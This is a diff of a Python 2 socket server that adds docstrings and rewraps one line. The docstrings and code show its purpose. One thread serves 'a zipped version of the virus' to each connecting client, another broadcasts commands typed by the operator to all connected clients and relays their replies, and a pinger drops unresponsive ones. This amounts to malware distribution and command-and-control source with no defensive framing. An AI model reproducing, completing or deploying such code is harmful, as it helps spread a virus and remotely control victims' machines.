@@ -15,6 +15,10 @@ clients = []
 
 
 def send_zip():
+    """
+    Creates a server thread which sends a zipped version of the virus to each
+    client connecting to it
+    """
     try:
         zip_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     except socket.error as e:
@@ -45,6 +49,10 @@ def send_zip():
 
 
 def send_messages():
+    """
+    A thread which sends messages received from standard input to all
+    connected clients
+    """
     print ">",
     while True:
         cmd = raw_input()
@@ -59,7 +67,8 @@ def send_messages():
                 print "%s: %s" % (address[0], client.recv(MAX_LEN))
                 print ">",
             except socket.error as e:
-                print "[*] %s disconnected from the server (%d) [*]" % (address[0], e.errno)
+                print "[*] %s disconnected from the server (%d) [*]" %\
+                      (address[0], e.errno)
                 print ">",
                 client.close()
                 clients.remove((client, address))
@@ -67,6 +76,10 @@ def send_messages():
 
 
 def garbage_collector():
+    """
+    A garbage collector thread which pings connected clients and closes the
+    connection with those who do not respond
+    """
     threading.Timer(PING_RATE, garbage_collector).start()
     # calls timer to make the method execute regularly
     mutex.acquire()
@@ -83,6 +96,10 @@ def garbage_collector():
 
 
 def main():
+    """
+    The main function calls all above threads, accepts incoming clients and
+    adds them to the list
+    """
     try:
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     except socket.error as e:
